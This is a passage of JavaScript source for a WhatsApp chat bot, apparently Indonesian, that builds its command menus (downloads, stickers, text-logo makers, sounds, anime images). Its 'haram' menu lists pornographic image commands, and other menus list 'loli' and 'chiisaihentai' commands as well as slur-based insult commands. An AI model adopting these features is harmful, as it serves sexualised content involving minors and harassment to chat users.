_ダ ${prefix}tagall_
_ダ ${prefix}sticktag [ _nama sticker_ ]_
_ダ ${prefix}totag [ _reply media_ ]_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break



case 'funmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ FUN MENU NEW*
_ダ ${prefix}popo_
_ダ ${prefix}bego_
_ダ ${prefix}tolol_
_ダ ${prefix}pinter_
_ダ ${prefix}pintar_
_ダ ${prefix}asu_
_ダ ${prefix}bodoh_
_ダ ${prefix}gay_
_ダ ${prefix}lesby_
_ダ ${prefix}bajingan_
_ダ ${prefix}jancok_
_ダ ${prefix}anjing_
_ダ ${prefix}ngentod_
_ダ ${prefix}ngentot_
_ダ ${prefix}monyet_
_ダ ${prefix}mastah_
_ダ ${prefix}newbie_
_ダ ${prefix}bangsat_
_ダ ${prefix}bangke_
_ダ ${prefix}sange_
_ダ ${prefix}sangean_
_ダ ${prefix}dakjal_
_ダ ${prefix}horny_
_ダ ${prefix}wibu_
_ダ ${prefix}puki_
_ダ ${prefix}pantex_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break

case 'soundmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ SOUND MENU NEW*
_ダ ${prefix}sound1_
_ダ ${prefix}sound2_
_ダ ${prefix}sound3_
_ダ ${prefix}sound4_
_ダ ${prefix}sound5_
_ダ ${prefix}sound6_
_ダ ${prefix}sound7_
_ダ ${prefix}sound8_
_ダ ${prefix}sound9_
_ダ ${prefix}sound10_
_ダ ${prefix}sound11_
_ダ ${prefix}sound12_
_ダ ${prefix}sound13_
_ダ ${prefix}sound14_
_ダ ${prefix}sound15_
_ダ ${prefix}sound16_
_ダ ${prefix}sound17_
_ダ ${prefix}sound18_
_ダ ${prefix}sound19_
_ダ ${prefix}sound20_
_ダ ${prefix}sound21_
_ダ ${prefix}sound22_
_ダ ${prefix}sound23_
_ダ ${prefix}sound24_
_ダ ${prefix}sound25_
_ダ ${prefix}sound26_        
_ダ ${prefix}sound27_ 
_ダ ${prefix}sound28_ 
_ダ ${prefix}sound29_ 
_ダ ${prefix}sound30_ 
_ダ ${prefix}sound31_
_ダ ${prefix}sound32_
_ダ ${prefix}sound33_
_ダ ${prefix}sound34_ 
_ダ ${prefix}sound35_ 
_ダ ${prefix}sound36_ 
_ダ ${prefix}sound37_  
_ダ ${prefix}sound38_ 
_ダ ${prefix}sound39_ 
_ダ ${prefix}sound40_
_ダ ${prefix}sound41_
_ダ ${prefix}sound42_
_ダ ${prefix}sound43_
_ダ ${prefix}sound44_
_ダ ${prefix}sound45_
_ダ ${prefix}sound46_
_ダ ${prefix}sound47_
_ダ ${prefix}sound48_
_ダ ${prefix}sound49_
_ダ ${prefix}sound50_
_ダ ${prefix}sound51_
_ダ ${prefix}sound52_
_ダ ${prefix}sound53_
_ダ ${prefix}sound54_
_ダ ${prefix}sound55_
_ダ ${prefix}sound56_
_ダ ${prefix}sound57_
_ダ ${prefix}sound58_
_ダ ${prefix}sound59_
_ダ ${prefix}sound60_
_ダ ${prefix}sound61_
_ダ ${prefix}sound62_
_ダ ${prefix}sound63_
_ダ ${prefix}sound64_
_ダ ${prefix}sound65_
_ダ ${prefix}sound66_
_ダ ${prefix}sound67_
_ダ ${prefix}sound68_
_ダ ${prefix}sound69_
_ダ ${prefix}sound70_
_ダ ${prefix}sound71_
_ダ ${prefix}sound72_
_ダ ${prefix}sound73_
_ダ ${prefix}sound74_
_ダ ${prefix}sound75_
_ダ ${prefix}sound76_
_ダ ${prefix}sound77_
_ダ ${prefix}sound78_
_ダ ${prefix}sound79_
_ダ ${prefix}sound80_
_ダ ${prefix}sound81_
_ダ ${prefix}sound82_
_ダ ${prefix}sound83_
_ダ ${prefix}sound84_
_ダ ${prefix}sound85_
_ダ ${prefix}sound86_
_ダ ${prefix}sound87_
_ダ ${prefix}sound88_
_ダ ${prefix}sound89_
_ダ ${prefix}sound90_
_ダ ${prefix}sound91_
_ダ ${prefix}sound92_
_ダ ${prefix}sound93_
_ダ ${prefix}sound94_
_ダ ${prefix}sound95_
_ダ ${prefix}sound96_
_ダ ${prefix}sound97_
_ダ ${prefix}sound98_
_ダ ${prefix}sound99_
_ダ ${prefix}sound100_
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break


case 'downloadmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ DOWNLOAD MENU*
_ダ ${prefix}wallml_
_ダ ${prefix}pinterest_
_ダ ${prefix}herolist_
_ダ ${prefix}herodetail [ _hero_ ]_
_ダ ${prefix}google [ _search_ ]_
_ダ ${prefix}gimage [ _search_ ]_
_ダ ${prefix}wiki [ _search_ ]_
_ダ ${prefix}mediafire [ _link_ ]_
_ダ ${prefix}ytsearch [ _judul_ ]_
_ダ ${prefix}ytmp4 [ _link yt_ ]_
_ダ ${prefix}ytmp3 [ _link yt_ ]_
_ダ ${prefix}play [ _judul lagu_ ]_
_ダ ${prefix}video [ _judul video_ ]_
_ダ ${prefix}tinyurl [ _link_ ]_
_ダ ${prefix}fetch [ _link_ ]_
_ダ ${prefix}igdl [ _link_ ]_
_ダ ${prefix}tiktokdl [ _link_ ]_
_ダ ${prefix}pinterest [ _search_ ]_
_ダ ${prefix}lirik [ _judul_ ]_
_ダ ${prefix}tourl [ _reply image/video_ ]_
_ダ ${prefix}kalkulator [ _angka_ ]_
_ダ ${prefix}translate [ _teks kodebhs_ ]_
_ダ ${prefix}ss [ _link_ ]_
_ダ ${prefix}playstore [ _search_ ]_
_ダ ${prefix}tiktokaudio [ _link_ ]_
_ダ ${prefix}brainly [ _search_ ]_
_ダ ${prefix}igstory [ _search_ ]_
_ダ ${prefix}igstalk [ _link_ ]_
_ダ ${prefix}twitter [ _link_ ]_
_ダ ${prefix}twmp3 [ _link_ ]_
_ダ ${prefix}linkwa [ _search_ ]_
_ダ ${prefix}chara [ _search_ ]_
_ダ ${prefix}otaku [ _search_ ]_
_ダ ${prefix}komiku [ _search_ ]_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'makermenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ MAKER MENU*
_ダ ${prefix}terbaikmaker teks/teks2_
_ダ ${prefix}bengekmaker teks/teks2_
_ダ ${prefix}memekertas teksnya_
_ダ ${prefix}blackpink teksnya_
_ダ ${prefix}neon teksnya_
_ダ ${prefix}greenneon teksnya_
_ダ ${prefix}advanceglow teksnya_
_ダ ${prefix}futureneon teksnya_
_ダ ${prefix}sandwriting teksnya_
_ダ ${prefix}sandsummer teksnya_
_ダ ${prefix}sandengraved teksnya_
_ダ ${prefix}metaldark teksnya_
_ダ ${prefix}neonlight teksnya_
_ダ ${prefix}holographic teksnya_
_ダ ${prefix}text1917 teksnya_
_ダ ${prefix}minion teksnya_
_ダ ${prefix}deluxesilver teksnya_
_ダ ${prefix}newyearcard teksnya_
_ダ ${prefix}bloodfrosted teksnya_
_ダ ${prefix}halloween teksnya_
_ダ ${prefix}jokerlogo teksnya_
_ダ ${prefix}fireworksparkle teksnya_
_ダ ${prefix}natureleaves teksnya_
_ダ ${prefix}bokeh teksnya_
_ダ ${prefix}toxic teksnya_
_ダ ${prefix}strawberry teksnya_
_ダ ${prefix}box3d teksnya_
_ダ ${prefix}roadwarning teksnya_
_ダ ${prefix}breakwall teksnya_
_ダ ${prefix}icecold teksnya_
_ダ ${prefix}luxury teksnya_
_ダ ${prefix}cloud teksnya_
_ダ ${prefix}summersand teksnya_
_ダ ${prefix}horrorblood teksnya_
_ダ ${prefix}thunder teksnya_
_ダ ${prefix}pornhub teksnya_
_ダ ${prefix}glitch teksnya_
_ダ ${prefix}avenger teksnya_
_ダ ${prefix}space teksnya_
_ダ ${prefix}ninjalogo teksnya_
_ダ ${prefix}marvelstudio teksnya_
_ダ ${prefix}lionlogo teksnya_
_ダ ${prefix}wolflogo teksnya_
_ダ ${prefix}steel3d teksnya_
_ダ ${prefix}wallgravity teksnya_
_ダ ${prefix}shadow teksnya_
_ダ ${prefix}cup teksnya_
_ダ ${prefix}cup1 teksnya_
_ダ ${prefix}romance teksnya_
_ダ ${prefix}smoke teksnya_
_ダ ${prefix}burnpaper teksnya_
_ダ ${prefix}lovemessage teksnya_
_ダ ${prefix}undergrass teksnya_
_ダ ${prefix}love teksnya_
_ダ ${prefix}coffe teksnya_
_ダ ${prefix}woodheart teksnya_
_ダ ${prefix}woodenboard teksnya_
_ダ ${prefix}summer3d teksnya_
_ダ ${prefix}wolfmetal teksnya_
_ダ ${prefix}nature3d teksnya_
_ダ ${prefix}underwater teksnya_
_ダ ${prefix}golderrose teksnya_
_ダ ${prefix}summernature teksnya_
_ダ ${prefix}letterleaves teksnya_
_ダ ${prefix}glowingneon teksnya_
_ダ ${prefix}fallleaves teksnya_
_ダ ${prefix}flamming teksnya_
_ダ ${prefix}harrypotter teksnya_
_ダ ${prefix}carvedwood teksnya_
_ダ ${prefix}arcade8bit teksnya_
_ダ ${prefix}battlefield4 teksnya_
_ダ ${prefix}pubg teksnya_
_ダ ${prefix}wetglass teksnya_
_ダ ${prefix}multicolor3d teksnya_
_ダ ${prefix}watercolor teksnya_
_ダ ${prefix}luxurygold teksnya_
_ダ ${prefix}galaxywallpaper teksnya_
_ダ ${prefix}lighttext teksnya_
_ダ ${prefix}beautifulflower teksnya_
_ダ ${prefix}puppycute teksnya_
_ダ ${prefix}royaltext teksnya_
_ダ ${prefix}heartshaped teksnya_
_ダ ${prefix}birthdaycake teksnya_
_ダ ${prefix}galaxystyle teksnya_
_ダ ${prefix}hologram3d teksnya_
_ダ ${prefix}greenneon teksnya_
_ダ ${prefix}glossychrome teksnya_
_ダ ${prefix}greenbush teksnya_
_ダ ${prefix}metallogo teksnya_
_ダ ${prefix}noeltext teksnya_
_ダ ${prefix}glittergold teksnya_
_ダ ${prefix}textcake teksnya_
_ダ ${prefix}starsnight teksnya_
_ダ ${prefix}wooden3d teksnya_
_ダ ${prefix}textbyname teksnya_
_ダ ${prefix}writegalacy teksnya_
_ダ ${prefix}galaxybat teksnya_
_ダ ${prefix}snow3d teksnya_
_ダ ${prefix}birthdayday teksnya_
_ダ ${prefix}goldplaybutton teksnya_
_ダ ${prefix}silverplaybutton teksnya_
_ダ ${prefix}freefire teksnya_
_ダ ${prefix}shadow teksnya_
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'storagemenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ STORAGE MENU*
_ダ ${prefix}listimage_
_ダ ${prefix}liststicker_
_ダ ${prefix}listvn_
_ダ ${prefix}addsticker [ _nama_ ]_
_ダ ${prefix}delsticker [ _nama_ ]_
_ダ ${prefix}addvn [ _nama_ ]_
_ダ ${prefix}delvn [ _nama_ ]_
_ダ ${prefix}addimage [ _nama_ ]_
_ダ ${prefix}delimage [ _nama_ ]_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'toolsmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ TOOLS*
_ダ ${prefix}nulis teksnya_
_ダ ${prefix}sticker_
_ダ ${prefix}stickertelegram [ _NAMA STICKER_ ]_
_ダ ${prefix}stickerwm [ _nama|author_ ]_
_ダ ${prefix}dadu_
_ダ ${prefix}semoji [ _emoji_ ]_
_ダ ${prefix}attp [ _teks_ ]_
_ダ ${prefix}ttp [ _teks_ ]_
_ダ ${prefix}ttp2 [ _teks_ ]_
_ダ ${prefix}ttp3 [ _teks_ ]_
_ダ ${prefix}ttp4 [ _teks_ ]_
_ダ ${prefix}toimg_
_ダ ${prefix}tomp3 [ _reply video_ ]_
_ダ ${prefix}togif [ _reply sticker gif_ ]_
_ダ ${prefix}robot [ _reply audio_ ]_
_ダ ${prefix}balik [ _reply audio_ ]_
_ダ ${prefix}bass [ _reply audio_ ]_
_ダ ${prefix}gemuk [ _reply audio_ ]_
_ダ ${prefix}detikvn [ _reply audio caption angka_ ]_
_ダ ${prefix}detikvideo [ _reply video caption angka_ ]_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'wibumenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ WIBU MENU*
_ダ ${prefix}zoro_ 
_ダ ${prefix}luffy_ 
_ダ ${prefix}sanji_ 
_ダ ${prefix}ussop_ 
_ダ ${prefix}nami_ 
_ダ ${prefix}copper_ 
_ダ ${prefix}naruto_ 
_ダ ${prefix}minato_ 
_ダ ${prefix}sasuke_ 
_ダ ${prefix}sakura_ 
_ダ ${prefix}boruto_ 
_ダ ${prefix}sarada_ 
_ダ ${prefix}mitsuki_ 
_ダ ${prefix}orochimaru_ 
_ダ ${prefix}tsunade_ 
_ダ ${prefix}kakashi_ 
_ダ ${prefix}killua_ 
_ダ ${prefix}gon_ 
_ダ ${prefix}saitama_ 
_ダ ${prefix}rimuru_ 
_ダ ${prefix}natsu_ 
_ダ ${prefix}tanjirou_ 
_ダ ${prefix}nezuko_ 
_ダ ${prefix}senku_   
_ダ ${prefix}loli_
_ダ ${prefix}husbu_
_ダ ${prefix}milf_
_ダ ${prefix}cosplay_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'harammenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ MENU HARAM*
_ダ ${prefix}bokep_
_ダ ${prefix}neko_
_ダ ${prefix}kanna_
_ダ ${prefix}sagiri_
_ダ ${prefix}megumin_
_ダ ${prefix}wallnime_
_ダ ${prefix}ass_
_ダ ${prefix}ahegao_
_ダ ${prefix}hentai_
_ダ ${prefix}yuri_
_ダ ${prefix}panties_
_ダ ${prefix}neko_
_ダ ${prefix}chiisaihentai_
_ダ ${prefix}trap_
_ダ ${prefix}blowjob_
_ダ ${prefix}yaoi_
_ダ ${prefix}ecchi_
_ダ ${prefix}ahegao_
_ダ ${prefix}hololewd_
_ダ ${prefix}sideoppai_
_ダ ${prefix}animefeets_
_ダ ${prefix}animebooty_
_ダ ${prefix}animethighss_
_ダ ${prefix}hentaiparadise_
_ダ ${prefix}animearmpits_
_ダ ${prefix}hentaifemdom_
_ダ ${prefix}lewdanimegirls_
_ダ ${prefix}biganimetiddies_
_ダ ${prefix}animebellybutton_
_ダ ${prefix}hentai4everyone_
_ダ ${prefix}bj_
_ダ ${prefix}ero_
_ダ ${prefix}cum_
_ダ ${prefix}feet_
_ダ ${prefix}yuri_
_ダ ${prefix}trap_
_ダ ${prefix}lewd_
_ダ ${prefix}feed_
_ダ ${prefix}eron_
_ダ ${prefix}solo_
_ダ ${prefix}gasm_
_ダ ${prefix}poke_
_ダ ${prefix}anal_
_ダ ${prefix}holo_
_ダ ${prefix}tits_
_ダ ${prefix}kuni_
_ダ ${prefix}kiss_
_ダ ${prefix}erok_
_ダ ${prefix}smug_
_ダ ${prefix}baka_
_ダ ${prefix}solog_
_ダ ${prefix}feetg_
_ダ ${prefix}lewdk_
_ダ ${prefix}waifu_
_ダ ${prefix}pussy_
_ダ ${prefix}femdom_
_ダ ${prefix}cuddle_
_ダ ${prefix}eroyuri_
_ダ ${prefix}cum_jpg_
_ダ ${prefix}blowjob_
_ダ ${prefix}erofeet_
_ダ ${prefix}holoero_
_ダ ${prefix}classic_
_ダ ${prefix}erokemo_
_ダ ${prefix}fox_girl_
_ダ ${prefix}futanari_
_ダ ${prefix}lewdkemo_
_ダ ${prefix}wallpaper_
_ダ ${prefix}pussy_jpg_
_ダ ${prefix}kemonomimi_
_ダ ${prefix}nsfw_avatar_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'gamemenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒GAME MENU*
_ダ ${prefix}tebakgambar_
_ダ ${prefix}caklontong_        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
